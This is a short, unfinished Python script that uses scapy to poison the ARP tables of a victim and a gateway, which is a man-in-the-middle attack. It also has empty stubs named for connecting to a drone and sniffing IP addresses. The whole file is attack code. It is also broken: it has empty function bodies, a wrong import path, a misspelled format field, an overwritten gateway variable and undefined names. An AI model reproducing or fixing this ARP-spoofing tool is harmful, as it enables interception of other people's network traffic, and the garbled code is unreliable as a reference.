from scapy.all import *
from scapy.layer.12 import Ether, ARP
import os
import time


def connectDrone():

def sniffIP():


def getMAC(ip):
	ans, uans = srp(Ether(dst='ff-ff-ff-ff-ff-ff')/ARP(pdst=ip), timeout = 5, retry = 10)
	for s, r in ans:
		return r.sprintf('%ehter.src%')

def poisonARP(scrip, targetip, targetmac):
	arp = ARP(op=2, psrc=scrip, pdst=targetip, hwdst=targetmac)
	send(arp)

def restoreARP(victimip, gatewayip, victimmac, gatewaymac):
	arp1 = ARP(op = 2, pdst=victimip, hwdst = 'ff-ff-ff-ff-ff-ff', hwsrc=gatewaymac)
	arp2 = ARP(op = 2, pdst=gatewayip, hwdst = 'ff-ff-ff-ff-ff-ff', hwsrc=victimmac)
	send(arp1, count=3)
	send(arp2, count=3)

def ARPSpoof(gatewayip, victimip):

	gatewayip = getMAC(gatewayip)
	victimmac = getMAC(victimip)

	if (victimmac == None) or (gatewaymac == None):
		print('Mac주소를 찾을 수가 없습니다.')
		return

	try:
		while True:
			poisonARP(gatewayip, victimip, victimmac)
			poisonARP(victimip, gatewayip, gatewaymac)
			sleep(3)
	except KeyboardInterrupt:
		restoreARP(victim, gatewayip, victimmac, gatewaymac)
		print('ARP Spoofing finish... Restored ARP table....₩')
